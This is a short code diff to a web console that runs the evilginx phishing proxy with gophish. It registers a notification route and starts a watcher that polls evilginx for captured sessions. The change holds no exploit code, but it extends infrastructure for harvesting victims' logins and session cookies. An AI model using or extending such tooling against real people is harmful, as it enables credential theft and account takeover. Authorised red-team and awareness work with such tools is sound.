@@ -19,6 +19,8 @@ import blacklistRouter from './routes/blacklist.js';
 import helpRouter from './routes/help.js';
 import certsRouter from './routes/certs.js';
 import gophishRouter from './routes/gophish.js';
+import notifyRouter from './routes/notify.js';
+import { bootstrapNotifyState, startSessionWatcher } from './lib/sessionWatcher.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const PORT = process.env.WEB_UI_PORT || 8080;
@@ -40,6 +42,7 @@ app.use('/api/blacklist', blacklistRouter);
 app.use('/api/help', helpRouter);
 app.use('/api/certs', certsRouter);
 app.use('/api/gophish', gophishRouter);
+app.use('/api/notify', notifyRouter);
 
 app.get('/api/health', (req, res) => {
   res.json({ ok: true, evilginxRunning: evilginx.ready });
@@ -69,6 +72,13 @@ evilginx.start(EVILGINX_BIN, ['-p', PHISHLETS_DIR, '-c', EVILGINX_CONFIG_DIR], {
 evilginx.on('exit', ({ exitCode, signal }) => {
   console.error(`evilginx process exited (code=${exitCode}, signal=${signal})`);
 });
+
+// Delayed so evilginx has time to finish booting before the first `sessions`
+// query — bootstrapNotifyState() degrades gracefully if it's not ready yet,
+// but there's no reason to race it on every fresh container start.
+setTimeout(() => {
+  bootstrapNotifyState().finally(startSessionWatcher);
+}, 5000);
 
 server.listen(PORT, () => {
   console.log(`ginx web console listening on :${PORT}`);
